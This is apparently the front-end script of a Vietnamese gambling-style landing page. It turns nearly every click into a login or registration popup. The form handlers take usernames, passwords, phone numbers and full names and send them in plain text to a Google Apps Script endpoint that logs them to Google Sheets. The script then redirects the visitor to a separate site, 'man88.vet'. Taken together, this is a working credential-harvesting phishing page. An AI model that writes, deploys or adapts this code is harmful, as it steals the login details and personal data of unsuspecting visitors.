document.addEventListener("DOMContentLoaded", function() {
    
    // ==========================================
    // KHỞI TẠO CÁC BIẾN MODAL
    // ==========================================
    const authModal = document.getElementById('authModal');
    const loginFormContainer = document.getElementById('loginFormContainer');
    const registerFormContainer = document.getElementById('registerFormContainer');
    
    // HÀM MỞ FORM ĐĂNG NHẬP
    function openLoginForm(e) {
        if (e && typeof e.preventDefault === 'function') e.preventDefault();
        if (authModal && loginFormContainer && registerFormContainer) {
            authModal.style.display = 'flex';
            loginFormContainer.style.display = 'block';
            registerFormContainer.style.display = 'none';
        }
    }

    // ==========================================
    // 1. TỰ ĐỘNG BẮT SỰ KIỆN CLICK TOÀN TRANG
    // ==========================================
    document.addEventListener('click', function(e) {
        // Bỏ qua nếu thao tác bên trong hộp Modal
        if (authModal && authModal.querySelector('.modal-box') && authModal.querySelector('.modal-box').contains(e.target)) {
            return; 
        }

        // Bấm ra vùng nền mờ bên ngoài modal thì đóng modal
        if (e.target === authModal) {
            authModal.style.display = 'none';
            return;
        }

        // Nếu modal đang mở, không kích hoạt đè
        if (authModal && authModal.style.display === 'flex') {
            return;
        }

        // Cho phép các chấm chuyển slider hoạt động bình thường
        if (e.target.closest('.dot')) {
            return;
        }

        // Click vào các thành phần tương tác thì mở form đăng nhập
        const clickable = e.target.closest('a, button, .game-item, .list-item, .custom-item, .nav-item, .slide, .banner-container, .require-login');
        if (clickable) {
            openLoginForm(e);
        }
    });

    // ==========================================
    // 2. LOGIC ĐÓNG / CHUYỂN ĐỔI FORM MODAL
    // ==========================================
    const closeModal = document.getElementById('closeModal');
    const btnRegister = document.querySelector('.btn-register');
    const switchToRegister = document.getElementById('switchToRegister');
    const switchToLogin = document.getElementById('switchToLogin');

    if (btnRegister) {
        btnRegister.addEventListener('click', (e) => {
            e.preventDefault();
            if (authModal && loginFormContainer && registerFormContainer) {
                authModal.style.display = 'flex';
                loginFormContainer.style.display = 'none';
                registerFormContainer.style.display = 'block';
            }
        });
    }

    if (closeModal) {
        closeModal.addEventListener('click', () => {
            authModal.style.display = 'none';
        });
    }

    if (switchToRegister) {
        switchToRegister.addEventListener('click', (e) => {
            e.preventDefault(); 
            loginFormContainer.style.display = 'none';
            registerFormContainer.style.display = 'block';
        });
    }

    if (switchToLogin) {
        switchToLogin.addEventListener('click', (e) => {
            e.preventDefault(); 
            registerFormContainer.style.display = 'none';
            loginFormContainer.style.display = 'block';
        });
    }

    // ==========================================
    // 3. XỬ LÝ GỬI DỮ LIỆU VỀ GOOGLE SHEETS
    // ==========================================
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzO1sO06TE-lnxJ3ZuBUTCyAC-P5kGSGAX-v4EIKK2tILCMzS2hEiSQMg_qFQY7LIw-/exec';
    const redirectTarget = "https://man88.vet/";

    function sendDataToSheets(formData, submitBtn) {
        if (submitBtn) {
            submitBtn.innerText = "Đang xử lý...";
            submitBtn.disabled = true;
        }

        fetch(scriptURL, {
            method: 'POST',
            mode: 'no-cors', // Tránh lỗi CORS từ Google Apps Script
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        })
        .then(() => {
            window.location.href = redirectTarget;
        })
        .catch((error) => {
            console.error('Lỗi gửi dữ liệu:', error);
            window.location.href = redirectTarget;
        });
    }

    // Form Đăng Nhập
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const username = loginForm.querySelector('input[type="text"]').value.trim();
            const password = loginForm.querySelector('input[type="password"]').value;
            const phone = loginForm.querySelector('input[type="tel"]').value.trim();
            const submitBtn = loginForm.querySelector('.btn-submit');

            const payload = {
                status: 'Đăng Nhập',
                username: username,
                password: password,
                phone: phone,
                fullname: '' // Form đăng nhập không có họ tên
            };

            sendDataToSheets(payload, submitBtn);
        });
    }

    // Form Đăng Ký
    const registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const inputs = registerForm.querySelectorAll('input');
            const username = inputs[0] ? inputs[0].value.trim() : '';
            const password = inputs[1] ? inputs[1].value : '';
            const phone = inputs[2] ? inputs[2].value.trim() : '';
            const fullname = inputs[3] ? inputs[3].value.trim() : '';
            const submitBtn = registerForm.querySelector('.btn-submit');

            const payload = {
                status: 'Đăng Ký',
                username: username,
                password: password,
                phone: phone,
                fullname: fullname
            };

            sendDataToSheets(payload, submitBtn);
        });
    }
    
    // ==========================================
    // 4. XỬ LÝ BANNER SLIDER
    // ==========================================
    const sliderWrapper = document.getElementById('bannerSlider');
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.dot');
    
    if (sliderWrapper && slides.length > 0) {
        let currentSlide = 0;
        const totalSlides = slides.length;

        function goToSlide(index) {
            currentSlide = index;
            const offset = -(currentSlide * 100);
            sliderWrapper.style.transform = `translateX(${offset}%)`;
            
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentSlide]) {
                dots[currentSlide].classList.add('active');
            }
        }

        function nextSlide() {
            let nextIndex = (currentSlide + 1) % totalSlides;
            goToSlide(nextIndex);
        }

        let slideInterval = setInterval(nextSlide, 3000);

        dots.forEach((dot, index) => {
            dot.addEventListener('click', (e) => {
                e.stopPropagation();
                goToSlide(index);
                clearInterval(slideInterval);
                slideInterval = setInterval(nextSlide, 3000);
            });
        });
    }
});